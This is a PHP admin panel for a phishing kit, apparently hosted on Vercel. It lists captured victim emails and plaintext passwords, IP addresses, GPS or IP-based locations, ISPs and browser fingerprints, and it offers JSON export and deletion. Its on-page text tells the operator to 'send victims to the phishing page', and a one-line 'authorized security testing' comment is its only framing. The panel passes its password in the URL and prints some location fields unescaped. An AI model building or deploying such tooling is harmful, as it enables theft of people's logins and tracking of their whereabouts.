<?php
/**
 * Admin Panel - View Captured Credentials
 * Authorized Security Testing Only
 *
 * Access: https://your-domain.vercel.app/api/admin.php
 * Default password: set ADMIN_PASS environment variable on Vercel
 */

// IMPORTANT: Set this environment variable in Vercel dashboard
// If not set, defaults to a strong random password (check logs)
$adminPass = getenv('ADMIN_PASS') ?: 'ChangeMeInVercelEnv-Var-ADMIN_PASS';

// Simple password check
$authenticated = false;
$inputPass = $_POST['password'] ?? ($_GET['pass'] ?? '');

if ($inputPass && $inputPass === $adminPass) {
    $authenticated = true;
}

// Load data
function loadData() {
    // Try persistent data file first
    $dataFile = __DIR__ . '/data.json';
    if (file_exists($dataFile)) {
        return json_decode(file_get_contents($dataFile), true) ?? [];
    }
    // Fallback to /tmp
    $tmpFile = '/tmp/data.json';
    if (file_exists($tmpFile)) {
        return json_decode(file_get_contents($tmpFile), true) ?? [];
    }
    return [];
}

$data = loadData();

// Handle clear data request
if ($authenticated && isset($_GET['action']) && $_GET['action'] === 'clear') {
    $dataFile = __DIR__ . '/data.json';
    file_put_contents($dataFile, json_encode([]));
    $data = [];
    header('Location: admin.php' . ($inputPass ? '?pass=' . urlencode($inputPass) : ''));
    exit;
}

// Handle export
if ($authenticated && isset($_GET['action']) && $_GET['action'] === 'export') {
    header('Content-Type: application/json');
    header('Content-Disposition: attachment; filename="captured_data_' . date('Y-m-d_H-i-s') . '.json"');
    echo json_encode($data, JSON_PRETTY_PRINT);
    exit;
}

?><!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Admin - Phishing Capture Panel</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { background: #0f0f1a; color: #e0e0e0; font-family: 'Courier New', monospace; padding: 20px; }
    h1 { color: #ff4444; font-size: 20px; margin-bottom: 8px; }
    .stats { color: #888; font-size: 13px; margin-bottom: 20px; }
    .login-box { background: #1a1a2e; padding: 30px; border-radius: 8px; max-width: 400px; margin: 60px auto; text-align: center; }
    .login-box h2 { color: #ff4444; margin-bottom: 8px; font-size: 18px; }
    .login-box p { color: #888; font-size: 12px; margin-bottom: 16px; }
    .login-box input { width: 100%; padding: 10px; background: #16213e; border: 1px solid #333; color: #fff; border-radius: 4px; font-size: 14px; margin-bottom: 12px; }
    .login-box button { background: #ff4444; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; font-size: 14px; }
    .login-box button:hover { background: #cc3333; }
    .toolbar { display: flex; gap: 12px; align-items: center; margin-bottom: 16px; flex-wrap: wrap; }
    .toolbar a, .toolbar button { color: #ff4444; text-decoration: none; font-size: 12px; border: 1px solid #ff4444; padding: 4px 12px; border-radius: 3px; background: transparent; cursor: pointer; }
    .toolbar a:hover, .toolbar button:hover { background: #ff4444; color: #fff; }
    .entry { background: #1a1a2e; border-left: 3px solid #ff4444; padding: 16px; margin-bottom: 12px; border-radius: 4px; }
    .entry .field { margin-bottom: 4px; font-size: 13px; }
    .entry .label { color: #888; }
    .entry .value { color: #00ff88; }
    .entry .value.pass { color: #ff6666; }
    .entry .value.email { color: #66b3ff; }
    .entry .geo { font-size: 11px; color: #aaa; margin-top: 4px; padding-left: 12px; border-left: 1px solid #333; }
    .entry .fingerprint { font-size: 10px; color: #666; margin-top: 4px; }
    .empty { color: #666; text-align: center; padding: 40px; font-size: 14px; }
    .warn { background: #2a1a1a; border: 1px solid #ff4444; color: #ff6666; padding: 8px 12px; border-radius: 4px; font-size: 12px; margin-bottom: 16px; display: inline-block; }
    @media (max-width: 600px) {
      body { padding: 10px; }
      .entry { padding: 10px; }
    }
  </style>
</head>
<body>
<?php if (!$authenticated): ?>
  <div class="login-box">
    <h2>🔒 Admin Panel</h2>
    <p>Enter the admin password (set via ADMIN_PASS env var)</p>
    <form method="POST">
      <input type="password" name="password" placeholder="Admin password" autofocus />
      <button type="submit">Access Panel</button>
    </form>
  </div>
<?php else: ?>
  <h1>⚠ PHISHING CAPTURE PANEL</h1>
  <div class="stats">
    Total captures: <strong><?php echo count($data); ?></strong>
    | Last capture: <strong><?php echo count($data) > 0 ? date('Y-m-d H:i:s', $data[count($data)-1]['capturedAt'] ?? 0) : 'N/A'; ?></strong>
  </div>

  <div class="toolbar">
    <span>Actions:</span>
    <a href="?pass=<?php echo urlencode($inputPass); ?>&action=export">⬇ Export JSON</a>
    <a href="?pass=<?php echo urlencode($inputPass); ?>&action=clear" onclick="return confirm('Delete ALL captured data?')">🗑 Clear All</a>
    <button onclick="location.reload()">🔄 Refresh</button>
  </div>

  <?php if (count($data) === 0): ?>
    <div class="empty">No data captured yet. Send victims to the phishing page.</div>
  <?php else: ?>
    <?php foreach (array_reverse($data) as $entry): ?>
    <div class="entry">
      <div class="field"><span class="label">📧 Email:</span> <span class="value email"><?php echo htmlspecialchars($entry['credentials']['email'] ?? ''); ?></span></div>
      <div class="field"><span class="label">🔑 Password:</span> <span class="value pass"><?php echo htmlspecialchars($entry['credentials']['password'] ?? ''); ?></span></div>
      <div class="field"><span class="label">🕐 Time:</span> <span class="value"><?php echo htmlspecialchars($entry['credentials']['submittedAt'] ?? $entry['timestamp'] ?? ''); ?></span></div>
      <div class="field"><span class="label">🌐 IP:</span> <span class="value"><?php echo htmlspecialchars($entry['ip'] ?? ''); ?></span></div>
      <?php if (isset($entry['geolocation'])): ?>
      <div class="geo">
        <?php if ($entry['geolocation']['type'] === 'gps'): ?>
          📍 GPS: <?php echo $entry['geolocation']['lat']; ?>, <?php echo $entry['geolocation']['lng']; ?> (acc: <?php echo $entry['geolocation']['accuracy']; ?>m)
        <?php else: ?>
          📍 IP Geo: <?php echo $entry['geolocation']['city'] ?? ''; ?>, <?php echo $entry['geolocation']['region'] ?? ''; ?>, <?php echo $entry['geolocation']['country'] ?? ''; ?>
          <?php if (isset($entry['geolocation']['latitude'])): ?>
            (<?php echo $entry['geolocation']['latitude']; ?>, <?php echo $entry['geolocation']['longitude']; ?>)
          <?php elseif (isset($entry['geolocation']['loc'])): ?>
            (<?php echo $entry['geolocation']['loc']; ?>)
          <?php endif; ?>
          | ISP: <?php echo $entry['geolocation']['org'] ?? 'N/A'; ?>
        <?php endif; ?>
      </div>
      <?php endif; ?>
      <?php if (isset($entry['fingerprint'])): ?>
      <div class="fingerprint">
        🖥 <?php echo htmlspecialchars($entry['fingerprint']['nav']['userAgent'] ?? 'N/A'); ?>
        | <?php echo $entry['fingerprint']['screen']['width'] ?? '?'; ?>x<?php echo $entry['fingerprint']['screen']['height'] ?? '?'; ?>
        | TZ: <?php echo $entry['fingerprint']['timezone'] ?? '?'; ?>
      </div>
      <?php endif; ?>
    </div>
    <?php endforeach; ?>
  <?php endif; ?>
<?php endif; ?>
</body>
</html>
